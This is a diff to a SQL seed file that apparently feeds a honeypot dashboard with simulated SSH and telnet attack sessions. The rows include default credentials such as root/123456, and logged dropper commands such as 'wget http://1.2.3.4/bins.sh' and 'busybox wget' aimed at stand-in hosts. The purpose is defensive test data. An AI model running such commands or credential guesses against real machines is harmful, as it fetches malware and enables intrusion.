@@ -41,7 +41,7 @@ VALUES
   -- Session s002 — 5.6.7.8, same ASN as above so unique_ips != total.
   (now() - interval '45 min', '5.6.7.8', 22, 'admin', 'admin',  NULL,                          's002', 'CN', 4134,  'Chinanet',         'Shanghai'),
   (now() - interval '44 min', '5.6.7.8', 22, 'root',  '123456', NULL,                          's002', 'CN', 4134,  'Chinanet',         'Shanghai'),
-  (now() - interval '43 min', '5.6.7.8', 22, NULL,    NULL,     'busybox wget http://x/y.sh',  's002', 'CN', 4134,  'Chinanet',         'Shanghai'),
+  (now() - interval '43 min', '5.6.7.8', 22, NULL,    NULL,     'busybox wget http://x.example/y.sh',  's002', 'CN', 4134,  'Chinanet',         'Shanghai'),
 
   -- Session s003 — 9.9.9.9 (US, AS15169) on telnet.
   (now() - interval '30 min', '9.9.9.9', 23, 'root',  'toor',   NULL,                          's003', 'US', 15169, 'Google LLC',       'Mountain View'),
@@ -81,7 +81,7 @@ VALUES
   ('cat /proc/cpuinfo',           'command', now() - interval '58 min', now() - interval '58 min', 1, 1),
   ('wget http://1.2.3.4/bins.sh', 'command', now() - interval '57 min', now() - interval '57 min', 5, 2),
   ('rm -rf /tmp/bins.sh',         'command', now() - interval '56 min', now() - interval '56 min', 3, 1),
-  ('busybox wget http://x/y.sh',  'command', now() - interval '43 min', now() - interval '43 min', 2, 1),
+  ('busybox wget http://x.example/y.sh',  'command', now() - interval '43 min', now() - interval '43 min', 2, 1),
   -- A delivery host on a non-standard port. Production had one of these and the
   -- defanger bracketed every dot in it, because the port travelled inside the
   -- host capture and made the address test fail. Nothing in the seed carried a
